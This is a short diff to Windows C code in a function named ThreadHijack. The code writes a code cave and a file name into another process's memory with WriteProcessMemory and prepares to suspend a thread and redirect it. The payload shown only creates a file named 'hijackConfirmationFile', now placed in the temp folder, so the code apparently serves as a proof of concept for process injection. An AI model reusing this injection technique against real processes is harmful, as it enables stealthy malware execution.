@@ -45,9 +45,12 @@ int ThreadHijack(HANDLE process, DWORD threadID) {
     *(DWORD64*)((PUCHAR)codeCave + 51) = (DWORD64)(ULONG_PTR)addrCreateFileA;
 	*(DWORD64*)((PUCHAR)codeCave + 74) = (DWORD64)(ULONG_PTR)addrCloseHandle;
 	
-	const TCHAR filename[] = "hijackConfirmationFile";
+	// const TCHAR filename[] = "hijackConfirmationFile";
+	TCHAR filename[MAX_PATH];
+    GetTempPath(MAX_PATH, filename);
+    lstrcatA(filename, "hijackConfirmationFile");
 
-	WriteProcessMemory(process, remoteMemory, codeCave, sizeof(codeCave), NULL);;
+	WriteProcessMemory(process, remoteMemory, codeCave, sizeof(codeCave), NULL);
 	WriteProcessMemory(process, (void*)((DWORD64)remoteMemory + sizeof(codeCave)), &filename, sizeof(filename), NULL);
 
 	// suspend the thread and query its control context
